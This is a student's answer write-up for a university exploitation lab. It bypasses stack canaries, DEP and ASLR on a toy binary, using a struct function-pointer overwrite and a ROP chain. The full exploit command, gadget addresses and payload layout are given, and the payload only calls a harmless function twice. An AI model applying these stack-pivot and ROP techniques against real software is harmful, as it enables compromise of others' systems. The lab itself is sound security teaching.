# Exploitation Lab III — Answers

## Section 2: Defeating Stack Canaries

### Q1: What bits/bytes of the canary are not random?

**Answer: 1 Byte: `0x00`**

By setting a breakpoint after `strcpy()` in `vuln()` and inspecting the canary at `$ebp - 0xc` across multiple runs, the **least significant byte** (lowest address, due to little-endian) is always `0x00`. The remaining 3 bytes are random.

This null byte acts as a string terminator — functions like `strcpy` stop copying at `0x00`, preventing a simple string overflow from writing past the canary to reach the return address.

### Q2: Which scenarios are rendered infeasible?

**Checked (infeasible):**

- **You want to own one of the vulnerable machines and be rather stealthy.** — Every failed canary guess crashes the process via `__stack_chk_fail`, leaving logs and killing the service. This is inherently noisy and not stealthy.
- **The vulnerability is based on unsafe string manipulation (e.g., strcpy, sprintf, gets,…).** — String functions terminate at `0x00`. The attacker cannot include `0x00` mid-payload to restore the canary's null byte without terminating the copy, so the canary will always be corrupted.

**Not checked (still feasible):**

- Owning a *specific* machine (byte-by-byte brute force possible in forking services).
- Unsafe memory operations like `memcpy`/`memset` — these copy a fixed length and don't stop at null bytes, so the canary's null byte provides no protection.

---

## Section 2.2: Bypass by Overwriting Function Pointers in Structs

The struct `foo_t` has `buf[128]` at a lower address and the function pointer `cb` directly above it. Overflowing `buf` with 128 bytes of junk + 4 bytes for the address of `unused()` overwrites `cb` without touching the stack canary (which protects the return address, not struct members).

```bash
./struct `p2bin 'b"A"*128 + pack("<L", 0x080491f7)'`
```

Output: `Got 132 (unused)` — confirming `unused()` was called instead of `cbfun()`.

---

## Section 3: Full ROP Exploit (ASLR + DEP + Stack Canaries)

### Goal

Call `unused()` twice, then `exit()` cleanly — bypassing all three protections.

### Key Addresses

| Symbol | Address |
|--------|---------|
| `unused()` | `0x080491f7` |
| `exit@plt` | `0x08049070` |
| `leave; ret` gadget | `0x08049115` |
| `pop ebx; ret` gadget | `0x0804901e` |

### Gadget Selection

The `call *%esi` instruction at `0x080492ae` invokes `foo.cb`. At that point, ESP is 28 bytes below `foo.buf` — no available `add esp` gadget matched this exact offset. Instead, the `leave; ret` gadget (`0x08049115`) was chosen as a **stack pivot**: `leave` executes `mov esp, ebp; pop ebp`, jumping ESP directly to the saved EBP area on the stack, which is within the overflowed region. This bypasses the canary check entirely since vuln's epilogue is never reached.

### Payload Layout (216 bytes)

| Bytes | Content | Purpose |
|-------|---------|---------|
| 0–127 | `A` × 128 | Fill `foo.buf` |
| 128–131 | `0x08049115` | Overwrite `foo.cb` → `leave; ret` |
| 132–135 | `0x08049115` | Overwrite corrupted input ptr with valid .text address |
| 136–175 | `A` × 40 | Junk padding (overwrites canary + saved regs) |
| 176–179 | `0x41414141` | Fake EBP (consumed by `leave`) |
| 180–183 | `0x080491f7` | `ret` → first `unused()` call |
| 184–187 | `0x0804901e` | `unused()` returns → `pop ebx; ret` (skips argument) |
| 188–191 | `0x41414141` | Argument for first `unused()` |
| 192–195 | `0x080491f7` | Second `unused()` call |
| 196–199 | `0x0804901e` | Returns → `pop ebx; ret` |
| 200–203 | `0x42424242` | Argument for second `unused()` |
| 204–207 | `0x08049070` | `exit@plt` → clean termination |
| 208–211 | `0x43434343` | exit's return address (irrelevant) |
| 212–215 | `0x01010101` | Exit code (non-zero to avoid null bytes) |

### Exploit Command

```bash
./struct `p2bin 'b"A"*128 + pack("<L", 0x08049115) + pack("<L", 0x08049115) + b"A"*40 + pack("<L", 0x41414141) + pack("<L", 0x080491f7) + pack("<L", 0x0804901e) + pack("<L", 0x41414141) + pack("<L", 0x080491f7) + pack("<L", 0x0804901e) + pack("<L", 0x42424242) + pack("<L", 0x08049070) + pack("<L", 0x43434343) + pack("<L", 0x01010101)'`
```

### Output

```
Got 1094795585 (unused)
Got 1111638594 (unused)
```

Program exits with code 01 — no segfault.

### Numbers Printed by `unused()`

The values `1094795585` and `1111638594` are `0x41414141` and `0x42424242` respectively — the arguments placed on the stack in the ROP chain. These are fully controlled by the attacker.

### How Each Protection Was Bypassed

- **Stack canaries**: The `leave; ret` gadget redirects execution before vuln's epilogue runs, so the canary check is never reached.
- **DEP**: No code is executed on the stack. The ROP chain reuses existing code in the binary (`unused()`, `exit@plt`, gadgets).
- **ASLR**: The binary is compiled with `-no-pie`, so all code addresses are fixed and predictable.

---

## Section 4: Most Important Takeaway

No single protection mechanism is sufficient on its own. DEP, ASLR, and stack canaries each address a specific attack vector, but each can be bypassed under the right conditions. True security requires **defense in depth** — enabling all available protections, using safe coding practices (avoiding `strcpy` and similar unsafe functions), and accepting that any individual defense can be defeated by a skilled attacker with enough time and creativity. This lab demonstrates why penetration testing matters: understanding offensive techniques is essential for building and verifying robust defenses.


b"A"*128                          ← fill the buffer with junk
pack("<L", 0x08049115)            ← overwrite foo.cb → program jumps to leave;ret
pack("<L", 0x08049115)            ← overwrites the input pointer (needs to be a valid address so strlen doesn't crash)
b"A"*40                           ← junk padding to reach the saved EBP
pack("<L", 0x41414141)            ← fake EBP (leave pops this, we don't care about it)
pack("<L", 0x080491f7)            ← ret lands here → calls unused() FIRST TIME
pack("<L", 0x0804901e)            ← unused() returns here → pop;ret skips the argument below
pack("<L", 0x41414141)            ← argument passed to first unused() → prints 1094795585
pack("<L", 0x080491f7)            ← pop;ret lands here → calls unused() SECOND TIME
pack("<L", 0x0804901e)            ← unused() returns here → pop;ret skips the argument below
pack("<L", 0x42424242)            ← argument passed to second unused() → prints 1111638594
pack("<L", 0x08049070)            ← pop;ret lands here → calls exit()
pack("<L", 0x43434343)            ← exit's return address (doesn't matter, exit never returns)
pack("<L", 0x01010101)            ← exit code (non-zero because 0x00 would break the string)


# Exploitation Lab III — Detailed Explanation of the ROP Exploit

## What is the goal?

We have a program (`struct.c`) with a buffer overflow vulnerability. We want to make it call the function `unused()` twice and then `exit()` cleanly — despite three protections being active: stack canaries, DEP, and ASLR.

## What is the vulnerability?

The struct `foo_t` contains a buffer (`buf[128]`) followed by a function pointer (`cb`). The function `vuln()` copies user input into `buf` using `strcpy`, which does no bounds checking. If we write more than 128 bytes, the extra bytes overflow directly into the function pointer `cb`. This lets us control where the program jumps to.

Crucially, the stack canary sits between local variables and the return address — it does NOT protect `cb` inside the struct. So we bypass the canary entirely.

## What is ROP?

ROP (Return-Oriented Programming) means we don't inject new code — instead we reuse small pieces of code that already exist in the program. These small pieces are called **gadgets**. Each gadget ends with a `ret` instruction, which pops the next address from the stack and jumps there. By carefully arranging addresses on the stack, we chain gadgets together like dominoes.

## The problem: the 28-byte gap

When the program calls `foo.cb`, the stack pointer (ESP) ends up 28 bytes **below** `foo.buf`. This means if we use a simple `ret` gadget, it would read from memory we don't control and crash.

We solved this with a **stack pivot**: the `leave; ret` gadget (`0x08049115`). The `leave` instruction does `mov esp, ebp; pop ebp`, which teleports ESP from the awkward position all the way up to the saved EBP area — which we also overwrote. Now ESP points into our controlled data and the ROP chain can execute.

## The exploit command

```bash
./struct `p2bin 'b"A"*128 + pack("<L", 0x08049115) + pack("<L", 0x08049115) + b"A"*40 + pack("<L", 0x41414141) + pack("<L", 0x080491f7) + pack("<L", 0x0804901e) + pack("<L", 0x41414141) + pack("<L", 0x080491f7) + pack("<L", 0x0804901e) + pack("<L", 0x42424242) + pack("<L", 0x08049070) + pack("<L", 0x43434343) + pack("<L", 0x01010101)'`
```

## Each piece explained

### `b"A"*128` — Fill the buffer (128 bytes)

128 bytes of garbage to fill `foo.buf` completely. We just need to get past it to reach `foo.cb`.

### `pack("<L", 0x08049115)` — Overwrite foo.cb (4 bytes)

This is the most important part. `foo.cb` normally points to `cbfun()`. We replace it with `0x08049115`, the address of the `leave; ret` gadget. When the program calls `foo.cb`, it jumps to our gadget instead.

### `pack("<L", 0x08049115)` — Fix the input pointer (4 bytes)

By writing past `foo.cb`, we corrupt a variable called `input` on the stack. The program calls `strlen(input)` before calling `foo.cb` — if `input` points to invalid memory, `strlen` crashes. So we overwrite it with `0x08049115`, a valid readable address in the program's code section. Any valid address would work, we just need `strlen` to not crash.

### `b"A"*40` — Junk padding (40 bytes)

Between the input pointer and the saved EBP, there are 40 bytes of stack data (the canary, saved registers, etc.). We overwrite all of it with junk. Normally corrupting the canary would trigger `__stack_chk_fail` and abort the program, but our `leave; ret` gadget causes the program to jump away before vuln's epilogue ever checks the canary.

### `pack("<L", 0x41414141)` — Fake EBP (4 bytes)

The `leave` instruction does `mov esp, ebp` then `pop ebp`. The `pop ebp` consumes 4 bytes from the stack. We don't need EBP for anything, so we put junk here. It gets consumed and thrown away.

### Now the ROP chain begins — this is where `ret` starts reading from.

### `pack("<L", 0x080491f7)` — First call to unused() (4 bytes)

After `leave` moves ESP and pops the fake EBP, `ret` pops this address and jumps to it. `0x080491f7` is the address of `unused()`. The program now runs `unused()`.

When `unused()` starts, the stack looks like this:

```
ESP →  [ 0x0804901e ]   ← unused() sees this as its RETURN ADDRESS
       [ 0x41414141 ]   ← unused() sees this as its ARGUMENT (int i)
```

This is standard x86 calling convention: when a function runs, ESP+0 is the return address and ESP+4 is the first argument.

So `unused()` reads `0x41414141` (= 1094795585 in decimal) as its argument and prints: `Got 1094795585 (unused)`.

### `pack("<L", 0x0804901e)` — pop ebx; ret gadget (4 bytes)

When `unused()` finishes, it executes `ret`, which pops `0x0804901e` and jumps there. This is a tiny gadget that does two things:

1. `pop ebx` — takes the next value off the stack (`0x41414141`, the argument we already used) and puts it in the `ebx` register. We don't care about `ebx`, it's just a trash can.
2. `ret` — pops the next address and jumps there.

**This gadget exists solely to skip over the argument.** Without it, `ret` would try to jump to `0x41414141` and crash.

### `pack("<L", 0x41414141)` — Argument for first unused() (4 bytes)

This is the integer value that `unused()` prints. After `unused()` is done, the `pop; ret` gadget skips over this value.

### `pack("<L", 0x080491f7)` — Second call to unused() (4 bytes)

After `pop; ret` skipped the argument, `ret` lands here and jumps to `unused()` again for the second time.

### `pack("<L", 0x0804901e)` — pop ebx; ret again (4 bytes)

Same trick. `unused()` returns here, and it skips the argument below.

### `pack("<L", 0x42424242)` — Argument for second unused() (4 bytes)

`0x42424242` = 1111638594 in decimal. Output: `Got 1111638594 (unused)`.

### `pack("<L", 0x08049070)` — Call exit() (4 bytes)

After `pop; ret` skips the second argument, `ret` lands here. `0x08049070` is the address of `exit@plt`. The program calls `exit()` and terminates cleanly — no segfault.

### `pack("<L", 0x43434343)` — exit's return address (4 bytes)

`exit()` never returns (it terminates the process), so this value is never used. We just put junk.

### `pack("<L", 0x01010101)` — Exit code (4 bytes)

This is the argument to `exit()`. The program exits with code 1. We use `0x01010101` instead of a simple `0x00000001` because `0x00` is a null byte, which would terminate the C string and break our payload.

## The chain visualized

```
leave; ret
    │
    │  ESP teleports to saved EBP area
    ▼
┌─────────────────────┐
│ 0x41414141          │ ← popped into EBP by leave (junk, ignored)
├─────────────────────┤
│ 0x080491f7          │ ← ret jumps here: unused() — FIRST CALL
├─────────────────────┤
│ 0x0804901e          │ ← unused() returns here: pop;ret
├─────────────────────┤
│ 0x41414141          │ ← argument for first unused(), then skipped by pop
├─────────────────────┤
│ 0x080491f7          │ ← ret jumps here: unused() — SECOND CALL
├─────────────────────┤
│ 0x0804901e          │ ← unused() returns here: pop;ret
├─────────────────────┤
│ 0x42424242          │ ← argument for second unused(), then skipped by pop
├─────────────────────┤
│ 0x08049070          │ ← ret jumps here: exit() — CLEAN EXIT
├─────────────────────┤
│ 0x43434343          │ ← exit's return addr (never used)
├─────────────────────┤
│ 0x01010101          │ ← exit code = 1
└─────────────────────┘
```

Every `ret` instruction pops the next 4 bytes from the stack and jumps there. The `pop; ret` gadget skips one entry. That's the entire mechanism — it's like a playlist of addresses that `ret` plays through one by one.

## What does `pack("<L", ...)` do?

`pack("<L", 0x080491f7)` converts the hex address into 4 raw bytes in **little-endian** format (least significant byte first). x86 CPUs store addresses this way in memory. So `0x080491f7` becomes the bytes `\xf7\x91\x04\x08`. Without `pack`, you'd be writing ASCII characters, not actual memory addresses.

## What is ROPgadget?

`ROPgadget` is a tool that scans a binary and finds all usable gadgets — small sequences of instructions that end with `ret`. We used it to find our two gadgets:

- `leave; ret` at `0x08049115` — the stack pivot that redirects ESP into our controlled data
- `pop ebx; ret` at `0x0804901e` — the argument skipper that lets us chain function calls

## How each protection was bypassed

**Stack canaries**: We overwrote the canary with junk, but `leave; ret` causes execution to jump away before vuln's epilogue checks the canary. The check never runs.

**DEP (Data Execution Prevention)**: We never execute code on the stack. Every address in our chain points to code that already exists in the binary — `unused()`, `exit()`, and the two gadgets.

**ASLR (Address Space Layout Randomization)**: The binary was compiled with `-no-pie`, so all code addresses are fixed and don't change between runs. We can hardcode them in our payload.

## Output

```
Got 1094795585 (unused)
Got 1111638594 (unused)
```

Program exits with code 1 — no crash, no segfault. The exploit works.